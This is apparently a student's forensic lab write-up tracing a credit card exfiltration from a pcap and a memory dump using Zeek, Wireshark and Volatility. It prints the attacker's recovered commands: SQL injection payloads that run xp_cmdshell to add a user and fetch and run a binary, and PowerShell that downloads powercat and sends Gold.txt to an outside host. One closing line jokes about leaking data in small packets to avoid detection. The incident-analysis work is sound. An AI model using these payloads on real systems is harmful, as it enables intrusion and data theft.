# Project 2

#### Thomas Davidson

### Overview 
The project description for this one was pretty consise and descriptive.  
"In this scenario a DLP security appliance has alerted to an attempt to exfiltrate credit card data. Management would
 like to know if any customer credit card data was actually exfiltrated, and if so, where to, amongst other questions
 . You are provided a pcap with traffic related to and a memory dump of the primary Card Data Environment (CDE
 ) server. This server runs several applications including a Microsoft SQL Server which is used to house some
  customer information, but not credit cards, although there are locations on the server which contain credit card data."

Suspected compromised server is 192.168.248.198

Cool, they have a particular goal in mind for this analysis, Will make sure to include was any Data exfiltrated to the
 last bit. Unfortunately there was no highlighted root cause and this may have completed a while ago and further may
  have already discarded some potentially useful information. 
  
### Initial Findings
Once again we are treated to a single folder that contained just a .raw memory dump file and a .pcap packet capture file
    
    $ cd project2/
    $ ls
        project2.pcap   project2.raw

so off the bat we get zeek logs

    $ mkdir zeek
    $ cd zeek
    $ sudo zeek < ../project2.pcap 
    $ ls
        conn.log  dhcp.log  dns.log  dpd.log  files.log  http.log  packet_filter.log  ssl.log  weird.log  x509.log

Since we are want to identify exfiltration of credit card numbers we might want to look for large db dumps. These
 will have lots of data. Will require both accessing the db, probably on another machine, and sending the data
 to the attacker. So we want to look for long data sending connections between .248.198 and 2 other machines. 

    $ sudo zeek-cut < conn.log id.orig_h id.resp_h duration history | sort -rn -k 3 > 1stcut.txt

I will note that the 100th longest connection was about 839ms, so probably not database retreival long. 

Knowing this I was able to count how many connections were of these lengths. some have a lot of connections, but
 mostof the connections were one offs.  
 below I cut off all the Ip addresses that hadless than 2 connections to our host machine. if it turns out that our
  attacker used a diffeent IP I may include them later. 
 
    $ cat 1stcut.txt | grep 192.168.248.198 | head -n 100 |  awk '{A[$2]++}END{for(i in A)print i,A[i]}' | sort -rnk 2
        23.213.133.49 26
        23.213.133.58 15
        192.184.69.215 4
        192.184.69.154 4
        192.168.248.198 4
        192.168.248.2 3
        172.217.9.130 3
        69.20.107.85 2
        34.233.70.197 2
        23.72.48.160 2
        199.232.5.140 2
        192.229.173.16 2
        172.217.9.138 2
        172.217.1.144 2
        157.240.18.35 2
        157.240.18.19 2
        104.67.78.56 2
        
Overall It was hard for me to find a database dump of a significant size. Now is not the time to answer the question
 as to why, but I will come back to that question. 
 
I moved over into wireshark to get potential Indicators of Compromise (IoC) and I found a Post request to /sql/login
.asp. I know ASP.NET makes it pretty easy to not make a sql injection vulnerability, but sometimes weird practices
 make for some forgetting of how to properly implement prepared statements in each and every POST request. 
 
I followed the stream.
The connection is requested by 192.168.248.200 to 192.168.248.198(this is the computer we have a memdump for)
    
    .200-   POST /sql/login.asp
        HTML Form URL Encoded: application/x-www-form-urlencoded
            Form item: "username" = "';exec master..xp_cmdshell "net user keatronevans P@ssw0rd$$$ /aDD "; --"
            Form item: "password" = ""
            Form item: "B1" = "Submit"
    
    .198-   302 object moved
    
    .200-   GET /sql/badlogon.asp HTTP/1.1
    .198-   200 OK
    
    .200-   POST /sql/login.asp     #PACKET:17860   time: 23:21:20.348163   downloaded malicous code ftp protocol
            HTML Form URL Encoded: application/x-www-form-urlencoded:
                Form item: "username" = "';exec master..xp_cmdshell "ftp -i 192.168.248.200 get keatron.exe "; --"
                Form item: "password" = ""
                Form item: "B1" = "Submit"
    
    .198-   302 object moved
    
    .200-   GET /sql/badlogon.asp HTTP/1.1
    .198-   200 OK
    
    
    .200-   POST /sql/login.asp     #PACKET:18176   time: 23:21:29.013153   start malicous code keatron.exe
            HTML Form URL Encoded: application/x-www-form-urlencoded
                Form item: "username" = "';exec master..xp_cmdshell "keatron.exe "; --"
                Form item: "password" = ""
                Form item: "B1" = "Submit"
    
    .198-   500 internal Service Error
    out handshake 

Oh man that certainly looks like a SQL injection attack with starting a string with "';" the single quote semicolon
 is a bad sign but what harm can they do without an OR true at the end of it?
When we look up [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp
-cmdshell-transact-sql?view=sql-server-ver16). oh no they can aritrarily access the windows shell as the sql client. 
at least they didn't get a reverse shell... but they did add a user.  the bad login seems to be basically a
 confirmation that the command has run. They could have created a reverse shell but instead they created
  a user and downloaded some file from the presently attacking computer to our victim(it's ours because I have the
   memdump).

### Folowup on that downloaded file 

The first thing I wanted to do was trace where this file goes to and where it may have run. This will tell us
about which computer is acting as the MSSQL server and our search may expand to that computer. To do this, I wanted to
know what time did this happen and can I locate the sending of the command to the database and then back at the
suspicious computer. We get these timestamps for the connections that were made between our two computers of
 interest.

    $ zeek-cut http.log < conn.log ts history id.orig_h id.orig_p id.resp_h id.resp_p proto duration | sort -n |grep 192
    .168.248.200 | grep 192.168.248.198  
        1581895257.897576       SAD     192.168.248.200 58617   192.168.248.198 80      tcp     0.427703
        1581895280.348163       DAF     192.168.248.200 58617   192.168.248.198 80      tcp     395.211477
        1581895280.376420       D       192.168.248.200 48003   192.168.248.198 55736   udp     0.072848
        1581895289.029400       HDA     192.168.248.200 5555    192.168.248.198 49329   tcp     0.048606
        1581895296.179846       DA      192.168.248.200 5555    192.168.248.198 49329   tcp     238.188778

We don't have a ton of connections and check them against wireshark. We find that the first connection was the one we
saw so no need for backtracking it. The packet that asked the SQL server to connect to our threat actor is
summerized below:
    
    packet# Epoch timestamp     sourceIP        destinationIP   proto   len payload
    17860	1581895280.348163	192.168.248.200	192.168.248.198	HTTP	698	POST /sql/login.asp HTTP/1.1  (application/x-www-form-urlencoded)
 
 this is the second connection in the conn.log each post request generated a new connection there. 
 
 I wanted a reasonable window for the time so I included the next 9.6s in my next search
 
     $ zeek-cut http.log < conn.log ts history id.orig_h id.orig_p id.resp_h id.resp_p proto duration | grep 158189528 | sort 
        1581895280.348163       DAF     192.168.248.200 58617   192.168.248.198 80      tcp     395.211477
        1581895280.376420       D       192.168.248.200 48003   192.168.248.198 55736   udp     0.072848
        1581895286.934111       AD      173.194.200.188 5228    192.168.248.198 49224   tcp     1080.081526
        1581895287.775873       D       192.168.248.1   5353    224.0.0.251     5353    udp     -
        1581895288.844829       C       192.168.248.198 138     192.168.248.255 138     udp     -
        1581895289.029400       HDA     192.168.248.200 5555    192.168.248.198 49329   tcp     0.048606

It looks like no additional connections were made to a remote SQL server so we can assume that the computer is
running the SQL server.

Next, lets locate keatron.exe.
Looking at packets from around this time showed me tftp traffic and seeing that it was a file transfer we were
looking for I checked out the file name and it was keatron.exe. Looking throgh the actual data sent I noticed at the
 end there is this license agreement. And it clarifies that the maker does not give any warrenties for the saftey of
  this product. It's a scary thought. 

    4.VS_VERSION_INFO..............?................StringFileInfo....040904b0.0..Comments.Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the ....License. You may obtain a copy of the License at
    
    
    
    http://www.apache.org/licenses/LICENSE-2.0
    
    
    
    Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CO....NDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License..V..CompanyName..Apache Software Foundation..j!.FileDescription..ApacheBench command line utility.....FileVer....sion..2.2.14.....InternalName.ab.exe.../.LegalCopyright.Copyright 2009 The Apache Software Foundation...6..OriginalFilename.ab.exe..F..ProductName..Apache HTTP Server..2..ProductVersion.2.2.14..D..VarFileInfo..$..Translation

At the top of the file we have this program cannot run in DOS mode indicating it is a windows binary. 

The timestamp indicates that this was the third of the five connections between the two computers. 


The fourth connection was the third sql injection to POST /sql/login.asp.

     
Our final Connection in the conn.log was establishing this tcp stream.

    tcp.stream eq 162

    
        Microsoft Windows [Version 6.3.9600]
        (c) 2013 Microsoft Corporation. All rights reserved.
        
        C:\Windows\system32>powershell
        powershell
        W.i.n.d.o.w.s. .P.o.w.e.r.S.h.e.l.l.
        .
        .C.o.p.y.r.i.g.h.t. .(.C.). .2.0.1.3. .M.i.c.r.o.s.o.f.t. .C.o.r.p.o.r.a.t.i.o.n... .A.l.l. .r.i.g.h.t.s. .r.e.s.e.r.v.e.d...
        .
        .
        .P.S. .C.:.\.W.i.n.d.o.w.s.\.s.y.s.t.e.m.3.2.>. .Test-NetConnection -Port 824 18.216.211.10 
   
It looks like our attacker got a shell. Initally it was cmd then they immediately opened powershell. Then, they
 tested a connection to a particular port. we also need to look into where this ip address goes and why are we
  testing our connection to it. 
 
I think we can look more into keatron.exe when we look at the memdump. 

I looked at the connection we saw in powershell to 18.216.211.10:824.

    $ zeek-cut < conn.log ts history id.orig_h id.orig_p id.resp_h id.resp_p proto duration | sort -n | grep 192.168.248.198 | grep 18.216.211.10
        1581895603.267121       H       18.216.211.10   824     192.168.248.198 49346   tcp     -
        1581895617.629582       F       18.216.211.10   824     192.168.248.198 49346   tcp     -
        1581896002.139282       H       18.216.211.10   824     192.168.248.198 60235   tcp     -
        1581896062.095523       AF      18.216.211.10   824     192.168.248.198 60235   tcp     0.052615
        1581896166.804406       HA      18.216.211.10   824     192.168.248.198 60247   tcp     1.141662
        1581896366.401235       AF      18.216.211.10   824     192.168.248.198 60247   tcp     0.051339

We see some similar stuff with a wireshark filter of:
    
    ip.addr == 192.168.248.198 && ip.addr == 18.216.211.10
    
conn.log didn't have the ping request but we got it in wireshark. 

We notice one connection took a second to operate and we look at packets that were produced there. 
I took the packet time and found a packet sent from 192.168.248.198 to 18.216.211.10 that had a significant length
of 4005 bytes. When I opened the file it was a Comma Seperated Vales (csv) file with a first row as column names. In
that row I found "IssuingNetwork,CardNumber,Name,Address,Country,CVV" the rest of the rows were filled in with I'm
sure faked information that is formatted to be what you may expect credit card information to look like. 
So, we answered our original question. "Did credit Card information get exfiltrated?" most certainly yes. 

This also answers our question earlier about why there wasn't a long connection with a lot of throughput passing
credit card details. It seems that the program is grabbing a limited number of entries for this grab. So, isolating
this computer may be urgent as they may be planning to periodically grab a small number of entries until they get the
whole database.

This wraps up what we may glean from the .pcap file. 

### Volatility for Context

Somehow, I can't get the more familiar Volatility 2 syntax to work for me now. Bear with me while I change to
 Volatility 3 syntax. 

    $ sudo volatility -f project2.raw windows.pstree
        Volatility 3 Framework 2.4.1
        Progress:  100.00               PDB scanning finished                        
        PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime
        
        484     372     wininit.exe     0xe00001139340  1       -       0       False   2020-02-16 23:12:52.000000      N/A
        * 572   484     services.exe    0xe00000186940  5       -       0       False   2020-02-16 23:12:52.000000      N/A
        ** 1784 572     sqlservr.exe    0xe00002ccc940  36      -       0       False   2020-02-16 23:13:30.000000      N/A
        *** 4772        1784    cmd.exe 0xe000073ac940  1       -       0       False   2020-02-16 23:21:29.000000      N/A
        **** 4804       4772    keatron.exe     0xe000073ae940  1       -       0       True    2020-02-16 23:21:29.000000      N/A
        ***** 4188      4804    cmd.exe 0xe00007395080  1       -       0       True    2020-02-16 23:21:29.000000      N/A
        ****** 4992     4188    powershell.exe  0xe000073764c0  3       -       0       True    2020-02-16 23:21:36.000000      N/A
        ****** 4948     4188    conhost.exe     0xe00006e5c4c0  2       -       0       False   2020-02-16 23:21:29.000000      N/A
        **** 4780       4772    conhost.exe     0xe00006e83940  2       -       0       False   2020-02-16 23:21:29.000000      N/A

        2772    3744    explorer.exe    0xe000001491c0  48      -       1       False   2020-02-16 23:18:15.000000      N/A
        * 4480  2772    cmd.exe 0xe00006e9e940  1       -       1       False   2020-02-16 23:25:51.000000      N/A
        ** 4504 4480    conhost.exe     0xe00006f16080  2       -       1       False   2020-02-16 23:25:51.000000      N/A
        ** 4416 4480    powershell.exe  0xe000073cd1c0  10      -       1       False   2020-02-16 23:26:11.000000      N/A
        * 3340  2772    MRCv120.exe     0xe000024c1080  11      -       1       True    2020-02-16 23:42:03.000000      N/A
        * 1624  2772    vmtoolsd.exe    0xe00001b7a080  6       -       1       False   2020-02-16 23:18:27.000000      N/A
        * 1596  2772    hfs.exe 0xe00005eca080  2       -       1       True    2020-02-16 23:18:29.000000      N/A

I got the pstree from the .raw file and two branches seemed suspicious at first. Let's start with the second branch. It looks like a remote shell that was nested in other programs. It has cmd spawning powershell yada yada. it
however is also where MRCv120.exe is being spawned, a program that is often used to get windows memory dumps. So let's 
look into this. I think if we look at everything here we notice that the base process is explorer.exe which hosts
various windows gui things. Maybe we can look into hfs.exe as it is a file server. This is really something I would
try to send an email for. Someone at the company has some code that describes the things on this server and I didn't
see apache webserver or anything so I wouldn't turn it off without additional context to make sure it wouldn't
disrupt a critical system. The cmd.exe spawning a powershell also could potentially be the connection that the IR
person who is taking the memdump. 

Let's talk about the first branch. We see the sql server still spawning cmd.exe > keatron.exe > cmd.exe > powershell.exe. 
This is all stuff we identified earlier.

hey so I couldn't find a plugin to get command history for volatility 3 so we will make a short sidebar for volatility2

    $ sudo volatility -f project2.raw --profile=Win2012R2x64 consoles
        ConsoleProcess: conhost.exe Pid: 4504
        Console: 0x7ff7da496260 CommandHistorySize: 50
        HistoryBufferCount: 4 HistoryBufferMax: 4
        OriginalTitle: Command Prompt
        Title: Administrator: Windows PowerShell
        ----
        CommandHistory: 0x5b7a21db70 Application: more.com Flags: 
        CommandCount: 0 LastAdded: -1 LastDisplayed: -1
        FirstCommand: 0 CommandCountMax: 50
        ProcessHandle: 0x0
        ----
        CommandHistory: 0x5b7a21dd50 Application: cvtres.exe Flags: 
        CommandCount: 0 LastAdded: -1 LastDisplayed: -1
        FirstCommand: 0 CommandCountMax: 50 
        ProcessHandle: 0x0
        ----
        CommandHistory: 0x5b7a21d180 Application: powershell.exe Flags: Allocated, Reset
        CommandCount: 10 LastAdded: 9 LastDisplayed: 7
        FirstCommand: 0 CommandCountMax: 50
        ProcessHandle: 0x5b7a1e6430
        Cmd #0 at 0x5b7a1e6910: Test-NetConnection -port 824 18.216.211.10
        Cmd #1 at 0x5b7a21d6b0: dir Gold.txt
        Cmd #2 at 0x5b7a21d920: more .\Gold.txt
        Cmd #3 at 0x5b7a222100: IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
        Cmd #4 at 0x5b7a21ae90: powercat
        Cmd #5 at 0x5b7a21d5c0: more .\Gold.txt
        Cmd #6 at 0x5b7a1e69d0: powercat -c 18.216.211.10 -i .\Gold.txt
        Cmd #7 at 0x5b7a222210: powercat -c 18.216.211.10 -p 824 -i .\Gold.txt
        Cmd #8 at 0x5b7a21d5f0: more .\Gold.txt
        Cmd #9 at 0x5b7a222280: powercat -c 18.216.211.10 -p 824 -i .\Gold.txt
        ----=
        CommandHistory: 0x5b7a21cfa0 Application: cmd.exe Flags: Allocated, Reset
        CommandCount: 6 LastAdded: 5 LastDisplayed: 5
        FirstCommand: 0 CommandCountMax: 50
        ProcessHandle: 0x5b7a1e6670
        Cmd #0 at 0x5b7a21c490: dir
        Cmd #1 at 0x5b7a21af70: cd ..
        Cmd #2 at 0x5b7a21c3d0: dir
        Cmd #3 at 0x5b7a21af90: cd ..
        Cmd #4 at 0x5b7a21c4e0: dir
        Cmd #5 at 0x5b7a21ad70: powershell
        ----
        Screen 0x5b7a1f8330 X:5 Y:0
        Dump:


We find 2 command histories that have readable text in them. It looks like the 2nd to last one is pid 4992, the last
 one is pid 4480. the last thing we want to do is get am image of keatron.exe to work with in the future. 

    $ sudo volatility -f project2.raw windows.dumpfiles --pid 4804
        Volatility 3 Framework 2.4.1
        Progress:  100.00               PDB scanning finished                        
        Cache   FileObject      FileName        Result
        
        ImageSectionObject      0xe000010fe900  kernel32.dll    file.0xe000010fe900.0xe00000ceb140.ImageSectionObject.kernel32.dll.img
        ImageSectionObject      0xe00000f62ca0  advapi32.dll    file.0xe00000f62ca0.0xe00000f628e0.ImageSectionObject.advapi32.dll.img
        ImageSectionObject      0xe00000cd4f20  cryptbase.dll   file.0xe00000cd4f20.0xe00000cd4b60.ImageSectionObject.cryptbase.dll.img
        ImageSectionObject      0xe00006e0d070  wsock32.dll     file.0xe00006e0d070.0xe000022373e0.ImageSectionObject.wsock32.dll.img
        DataSectionObject       0xe0000249f070  keatron.exe     file.0xe0000249f070.0xe00000d2f430.DataSectionObject.keatron.exe.dat
        ImageSectionObject      0xe0000249f070  keatron.exe     file.0xe0000249f070.0xe00006f16e60.ImageSectionObject.keatron.exe.img
        ImageSectionObject      0xe00000cd4a70  bcryptprimitives.dll    file.0xe00000cd4a70.0xe00000cd45b0.ImageSectionObject.bcryptprimitives.dll.img
        ImageSectionObject      0xe00005cd7c60  mswsock.dll     file.0xe00005cd7c60.0xe00005cd7910.ImageSectionObject.mswsock.dll.img
        ImageSectionObject      0xe00000ce85f0  sspicli.dll     file.0xe00000ce85f0.0xe00000cd4010.ImageSectionObject.sspicli.dll.img
        ImageSectionObject      0xe00000cf04d0  sechost.dll     file.0xe00000cf04d0.0xe00000ce8cb0.ImageSectionObject.sechost.dll.img
        ImageSectionObject      0xe00000c873c0  rpcrt4.dll      file.0xe00000c873c0.0xe00000c87970.ImageSectionObject.rpcrt4.dll.img
        ImageSectionObject      0xe00000f66070  KernelBase.dll  file.0xe00000f66070.0xe00000f66cb0.ImageSectionObject.KernelBase.dll.img
        ImageSectionObject      0xe000010fca00  msvcrt.dll      file.0xe000010fca00.0xe00000c84e20.ImageSectionObject.msvcrt.dll.img
        ImageSectionObject      0xe00000c92670  nsi.dll file.0xe00000c92670.0xe00000c874b0.ImageSectionObject.nsi.dll.img
        ImageSectionObject      0xe0000157d340  ntdll.dll       file.0xe0000157d340.0xe00000cf7c80.ImageSectionObject.ntdll.dll.img
        ImageSectionObject      0xe00000cbd290  wow64.dll       file.0xe00000cbd290.0xe00000f71c60.ImageSectionObject.wow64.dll.img
        ImageSectionObject      0xe00000cdaf20  wow64cpu.dll    file.0xe00000cdaf20.0xe00000cdab30.ImageSectionObject.wow64cpu.dll.img
        ImageSectionObject      0xe00001104530  ws2_32.dll      file.0xe00001104530.0xe00001109c60.ImageSectionObject.ws2_32.dll.img
        ImageSectionObject      0xe0000110e2a0  wow64win.dll    file.0xe0000110e2a0.0xe00000f6ba90.ImageSectionObject.wow64win.dll.img
        ImageSectionObject      0xe00001571330  ntdll.dll       file.0xe00001571330.0xe000015793e0.ImageSectionObject.ntdll.dll.img
                    
### Root Cause

It looks like the initial attack was from a sql injection on a ASP.NET server. This attack was made worse by the SQL
server being able to run xp_cmdshell. [There are ways to disable this command](https://www.c-sharpcorner.com/blogs/enabling-disabling-xpcmdshell-in-sql-server1), but you will need to consult a development team who operates the
codebase to approve that kind of change. 

### Containment Reccomendations

Off the bat, the fact that we were able to see that some credit card data was exfiltrated, but not a lot of it was
should lead us to isolate the computer we got a memory dump out of quickly. hopefully there is a redundant system
, but currently there is a threat actor who can access credit card data that has more credit card data to access. So
the urgency and severity would indicate that maybe a service interruption is justified. It doesn't appear that other
servers on your system are already compromised but given the attack pattern it looks like some things were scoped
out ahead of time, so there might be other systems that were similarly enumerated before the attack. Isolate the
computer at IP .200 as best as possible and run a memory dump on it figure out how it is controlled. further look
into .pcaps of the subnet to see if there are any other devices comprimised by .200. 


### Eradication Reccomendations

It doesn't look like a lot of persistence or privledge escalation was part of this attack so it could be possible to
eradicate the current threat by killing pids 4772 4804, 4188, 4992, 4188, 4780. But We really need to make sure that
some C# developers correct the mistakes that lead to the SQLinjection in the first palce. We also need to remove the
user keatronevens. This could allow for remote access. 

### Lessons Learned. 

Use prepared statements or a query builder for SQL. If you are going to dump a database make sure it leaks in normal
 sized packets because it can take a while to track that down rather than if you just take the whole thing at one time. 
